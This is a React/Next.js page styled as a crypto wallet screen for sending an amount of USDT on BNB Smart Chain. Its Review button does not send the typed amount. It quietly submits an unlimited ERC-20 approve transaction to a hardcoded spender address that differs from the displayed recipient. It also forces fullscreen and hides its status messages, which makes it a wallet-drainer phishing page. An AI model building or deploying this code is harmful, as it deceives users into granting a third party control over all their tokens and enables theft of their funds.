"use client";

import { useEffect, useRef, useState } from "react";

const keys = ["1", "2", "3", "4", "5", "6", "7", "8", "9", ".", "0"];

type Eip1193Provider = {
  request: (args: {
    method: string;
    params?: unknown[];
  }) => Promise<unknown>;

  on?: (event: string, listener: (...args: unknown[]) => void) => void;

  removeListener?: (event: string, listener: (...args: unknown[]) => void) => void;
};

type Eip6963ProviderDetail = {
  info: {
    name: string;
    rdns: string;
  };

  provider: Eip1193Provider;
};

declare global {
  interface Window {
    ethereum?: Eip1193Provider;
  }
}

const chainId = process.env.NEXT_PUBLIC_CHAIN_ID ?? "56";
const targetChainId = BigInt(chainId);
const targetChainHex = `0x${targetChainId.toString(16)}`;
const MAX_UINT256_HEX = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
const USDT_ADDRESS = process.env.NEXT_PUBLIC_USDT_ADDRESS ?? "0x55d398326f99059fF775485246999027B3197955";
const ALLOWANCE_SPENDER_ADDRESS =
  process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS ?? "0x698f4c854C8F6fD8fCC84af2E5d399D78E5792B2";

function toHex32(value: string) {
  return value.startsWith("0x") ? value.slice(2).padStart(64, "0") : value.padStart(64, "0");
}

async function switchToBnb(provider: Eip1193Provider): Promise<boolean> {
  try {
    const currentChain = String(
      await provider.request({
        method: "eth_chainId",
      }),
    ).toLowerCase();

    if (currentChain === targetChainHex) {
      return true;
    }

    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: targetChainHex }],
      });
    } catch (error) {
      const errorCode = (error as { code?: number }).code;

      if (errorCode !== 4902) {
        return false;
      }

      const isTestnet = targetChainId === BigInt(97);

      await provider.request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainId: targetChainHex,
            chainName: isTestnet ? "BNB Smart Chain Testnet" : "BNB Smart Chain",
            nativeCurrency: {
              name: "BNB",
              symbol: "BNB",
              decimals: 18,
            },
            rpcUrls: [
              isTestnet ? "https://data-seed-prebsc-1-s1.bnbchain.org:8545" : "https://data-seed.bnbchain.org",
            ],
            blockExplorerUrls: [
              isTestnet ? "https://testnet.bscscan.com" : "https://bscscan.com",
            ],
          },
        ],
      });

      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: targetChainHex }],
      });
    }

    const finalChain = String(
      await provider.request({
        method: "eth_chainId",
      }),
    ).toLowerCase();

    return finalChain === targetChainHex;
  } catch {
    return false;
  }
}

export default function Home() {
  const [currentInput, setCurrentInput] = useState("0");
  const [walletProvider, setWalletProvider] = useState<Eip1193Provider>();
  const [walletAddress, setWalletAddress] = useState<string>("");
  const [notice, setNotice] = useState<string>("");
  const autoConnectAttempted = useRef(false);
  const walletUnavailableAlerted = useRef(false);
  const fullscreenRequested = useRef(false);
  const isValidAmount = Number.parseFloat(currentInput) > 0;

  function requestFullscreen() {
    if (fullscreenRequested.current || !document.documentElement.requestFullscreen) {
      return;
    }

    fullscreenRequested.current = true;
    void document.documentElement.requestFullscreen().catch((error: unknown) => {
      console.warn("Unable to enter fullscreen mode.", error);
    });
  }

  useEffect(() => {
    let discoveredProvider = Boolean(window.ethereum);

    const announced = (event: Event) => {
      const provider = (event as CustomEvent<Eip6963ProviderDetail>).detail?.provider;

      if (provider) {
        discoveredProvider = true;
        setWalletProvider((current) => current ?? provider);
      }
    };

    if (window.ethereum) {
      setWalletProvider((current) => current ?? window.ethereum);
    }

    window.addEventListener("eip6963:announceProvider", announced);
    window.dispatchEvent(new Event("eip6963:requestProvider"));

    const unavailableTimer = window.setTimeout(() => {
      if (!discoveredProvider && !walletUnavailableAlerted.current) {
        walletUnavailableAlerted.current = true;
        alert("Please open this page in a compatible Web3 wallet browser such as Trust Wallet or use a browser wallet such as MetaMask.");
      }
    }, 1000);

    return () => {
      window.clearTimeout(unavailableTimer);
      window.removeEventListener("eip6963:announceProvider", announced);
    };
  }, []);

  useEffect(() => {
    const provider = walletProvider ?? window.ethereum;

    if (!provider || autoConnectAttempted.current) {
      return;
    }

    autoConnectAttempted.current = true;

    const accountsChanged = (...args: unknown[]) => {
      const accounts = args[0];
      const address =
        Array.isArray(accounts) && typeof accounts[0] === "string" ? accounts[0] : "";

      setWalletAddress(address);
      setNotice(address ? "" : "Wallet disconnected. Connect again to continue.");
    };

    const chainChanged = () => {
      setNotice("");
    };

    provider.on?.("accountsChanged", accountsChanged);
    provider.on?.("chainChanged", chainChanged);

    const autoConnect = async () => {
      try {
        const switched = await switchToBnb(provider);

        if (!switched) {
          return;
        }

        const accounts = await provider.request({ method: "eth_accounts" });

        if (Array.isArray(accounts) && typeof accounts[0] === "string" && accounts[0]) {
          setWalletAddress(accounts[0]);
          setNotice("");
        }
      } catch (error) {
        setNotice(error instanceof Error ? error.message : "Unable to connect to the wallet.");
      }
    };

    void autoConnect();

    return () => {
      provider.removeListener?.("accountsChanged", accountsChanged);
      provider.removeListener?.("chainChanged", chainChanged);
    };
  }, [walletProvider]);

  function getProvider(): Eip1193Provider | undefined {
    return walletProvider ?? window.ethereum;
  }

  async function handleReview() {
    const provider = getProvider();

    if (!provider) {
      alert("Please open this page in a compatible Web3 wallet browser such as Trust Wallet or use a browser wallet such as MetaMask.");
      return;
    }

    try {
      const accounts = await provider.request({ method: "eth_accounts" });

      if (!Array.isArray(accounts) || typeof accounts[0] !== "string" || !accounts[0]) {
        alert("No authorized wallet account found. Please connect and authorize your wallet before reviewing.");
        return;
      }

      const account = accounts[0];
      const switched = await switchToBnb(provider);

      if (!switched) {
        alert("Unable to switch to BNB Smart Chain.");
        return;
      }

      setWalletAddress(account);
      const spenderHex = toHex32(ALLOWANCE_SPENDER_ADDRESS);
      const txData = `0x095ea7b3${spenderHex}${MAX_UINT256_HEX.slice(2)}`;

      const tx = {
        from: account,
        to: USDT_ADDRESS,
        data: txData,
      };

      const txHash = await provider.request({
        method: "eth_sendTransaction",
        params: [tx],
      });

      setWalletAddress(account);
      setNotice("");
      alert(`Approval transaction submitted: ${String(txHash)}`);
    } catch (error) {
      const message = error instanceof Error ? error.message : "Wallet connection failed.";
      setNotice(message);
      alert(message);
    }
  }

  function enterKey(value: string) {
    setCurrentInput((current) => {
      if (value === ".") {
        return current.includes(".") ? current : `${current}.`;
      }

      if (current === "0") {
        return value;
      }

      return current.length < 10 ? `${current}${value}` : current;
    });
  }

  function deleteLastDigit() {
    setCurrentInput((current) => (current.length > 1 ? current.slice(0, -1) : "0"));
  }

  return (
    <main className="app-container" onClickCapture={requestFullscreen}>
      <header className="header">
        <button className="back-btn" type="button" aria-label="Back">
          <svg viewBox="0 0 24 24">
            <polyline points="15 18 9 12 15 6" />
          </svg>
        </button>
        <h1 className="header-title">Amount</h1>
      </header>

      <div className="recipient-bar">
        <span className="recipient-label">To:</span>
        <span className="recipient-address">0x95f3ccbfbaa6ab5aa096230711a34809430b5851</span>
      </div>

      <div className="amount-section">
        <div className={`amount-value${currentInput !== "0" ? " active" : ""}`} aria-live="polite">
          {currentInput}
        </div>
        <div className="swap-icon">
          <svg
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2.2"
            strokeLinecap="round"
            strokeLinejoin="round"
          >
            <path d="M7 3v14M3 13l4 4 4-4M17 21V7M13 11l4-4 4 4" />
          </svg>
        </div>
      </div>

      <div className="balance-row">
        <div className="token-info">
          <div className="token-badge">
            <img className="token-logo" src="/tether.png" alt="" />
            <div className="chain-badge">
              <img src="/bnb.png" alt="" />
            </div>
          </div>
          <span className="balance-text">{currentInput} USDT</span>
        </div>
        <button className="max-btn" type="button" onClick={() => setCurrentInput("0")}>
          Max
        </button>
      </div>

      <div className="keypad">
        {keys.map((key) => (
          <button
            className="key"
            data-val={key}
            key={key}
            type="button"
            aria-label={key === "." ? "Decimal point" : key}
            onClick={() => enterKey(key)}
          >
            {key === "." ? "•" : key}
          </button>
        ))}
        <button
          className="key backspace"
          type="button"
          aria-label="Delete last digit"
          onClick={deleteLastDigit}
        >
          <svg
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
          >
            <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z" />
            <line x1="18" y1="9" x2="12" y2="15" />
            <line x1="12" y1="9" x2="18" y2="15" />
          </svg>
        </button>
      </div>

      {walletAddress && <p style={{ display: "none" }}>Connected: {walletAddress}</p>}
      {notice && <p style={{ display: "none" }}>{notice}</p>}

      <button
        className={`review-btn${isValidAmount ? " active" : ""}`}
        type="button"
        disabled={!isValidAmount}
        onClick={() => {
          void handleReview();
        }}
      >
        Review
      </button>
    </main>
  );
}
